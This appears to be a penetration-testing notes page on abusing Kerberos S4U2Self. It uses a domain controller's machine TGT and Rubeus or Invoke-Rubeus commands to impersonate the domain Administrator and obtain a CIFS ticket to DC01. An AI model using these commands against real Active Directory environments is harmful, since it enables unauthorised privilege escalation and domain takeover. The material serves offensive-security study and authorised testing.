# S4U2Self

If we manage to obtain a Ticket Granting Ticket (TGT) for a system on the domain and then import that ticket into a logon session, we would not be able to access it. This is due to the fact the system accounts do not have remote access privileges over themselves.&#x20;

The image below represents a logon session where a TGT for the Domain Controller DC01 has been imported.

<figure><img src="../../../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>

As the Domain Controller does not have remote access privileges over itself it is not possible to list the contents of its C$ drive remotely.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (4).png" alt=""><figcaption></figcaption></figure>

However, a technique exists called S4U2Self where we are able to obtain a Ticket Granting Service (TGS) as a user who we know has administrative rights over the Domain Controller. For example, any Domain Administrator.

Rubeus has the `/self` flag for this.

{% tabs %}
{% tab title="Rubeus Binary" %}
```bash
# Syntax
Rubeus.exe s4u /impersonateuser:[User-To-Impersonate] /self 
/altservice:[Service/FQDN] /user:[User] /ticket:[Base64 Ticket] /nowrap

# In practice
Rubeus.exe s4u /impersonateuser:Administrator /self 
/altservice:cifs/dc01.security.local /user:dc01$ /ticket:iujhdfdsf== /nowrap
```
{% endtab %}

{% tab title="Invoke-Rubeus" %}
{% code overflow="wrap" %}
```powershell
Invoke-Rubeus -Command "s4u /impersonateuser:[User-To-Impersonate] /self 
/altservice:[Service/FQDN] /user:[User] /ticket:[Base64 Ticket] /nowrap"
```
{% endcode %}
{% endtab %}
{% endtabs %}

Below, using the TGT of the Domain Controller obtained earlier and using the command examples above, we are able to requests a TGS to the Domain Controller DC01 for the CIFS server as the native Domain Administrator account.

<figure><img src="../../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption></figcaption></figure>

This ticket was then imported into a new current session. We can now see the cached tickets is for the Administrator to the CIFS server on the Domain Controller.

<figure><img src="../../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

